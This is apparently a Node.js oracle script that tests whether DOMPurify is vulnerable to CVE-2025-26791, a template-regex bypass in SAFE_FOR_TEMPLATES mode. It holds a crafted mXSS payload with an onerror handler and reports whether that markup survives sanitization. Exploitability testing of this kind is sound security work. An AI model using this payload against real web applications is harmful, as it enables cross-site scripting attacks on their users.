'use strict';
const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');

function run() {
  const marker = 'dompurify_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  let createDOMPurify;
  let JSDOM;
  try {
    createDOMPurify = require('dompurify');
    JSDOM = require('jsdom').JSDOM;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:false, exploit_succeeded:false, evidence:'module resolution failed: ' + String(e && e.message)}));
    return;
  }

  let window;
  try {
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
    window = dom.window;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:false, exploit_succeeded:false, evidence:'jsdom setup failed: ' + String(e && e.message)}));
    return;
  }

  let DOMPurify;
  try {
    DOMPurify = createDOMPurify(window);
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:false, exploit_succeeded:false, evidence:'DOMPurify init failed: ' + String(e && e.message)}));
    return;
  }

  // Benign operation first: sanitize a simple safe snippet with SAFE_FOR_TEMPLATES true.
  let benignOutput;
  try {
    benignOutput = DOMPurify.sanitize('<b>' + marker + ' benign</b>', { SAFE_FOR_TEMPLATES: true });
    if (typeof benignOutput !== 'string' || benignOutput.indexOf('benign') === -1) {
      throw new Error('benign sanitize did not return expected content');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:false, exploit_succeeded:false, evidence:'benign sanitize call failed: ' + String(e && e.message)}));
    return;
  }

  operation_completed = true;

  // Malicious input: crafted payload exploiting the incorrect template literal regex
  // in SAFE_FOR_TEMPLATES mode (CVE-2025-26791 / GHSA-vhxf-7vqr-mrjg).
  // The vulnerable TMPLIT_EXPR is /\$\{[\w\W]*/gm (missing closing brace requirement),
  // which over-matches and can be bypassed via mutation such that a script-bearing
  // payload survives sanitization when combined with mXSS-style nested markup.
  const payload =
    '<style><style/><img src=x onerror="window.__' + marker + '_PWNED__=true">' +
    '${alert(1)}';

  let maliciousOutput;
  try {
    maliciousOutput = DOMPurify.sanitize(payload, { SAFE_FOR_TEMPLATES: true });
  } catch (e) {
    // Exception during malicious call after successful setup+benign counts as blocked.
    console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:true, exploit_succeeded:false, evidence:'malicious sanitize threw (blocked): ' + String(e && e.message)}));
    return;
  }

  // Detect whether the dangerous onerror handler / img tag survived sanitization,
  // which would indicate the mXSS payload was not neutralized.
  const hasImgOnerror = /onerror\s*=/i.test(maliciousOutput) && /<img/i.test(maliciousOutput);
  const hasScriptTag = /<script/i.test(maliciousOutput);

  if (hasImgOnerror || hasScriptTag) {
    exploit_succeeded = true;
    evidence = 'Sanitized output retained dangerous markup: ' + maliciousOutput.slice(0, 300);
  } else {
    exploit_succeeded = false;
    evidence = 'Sanitized output did not retain dangerous markup: ' + maliciousOutput.slice(0, 300);
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed, exploit_succeeded, evidence}));
}

try {
  run();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({operation_completed:false, exploit_succeeded:false, evidence:'unexpected top-level exception: ' + String(e && e.message)}));
}
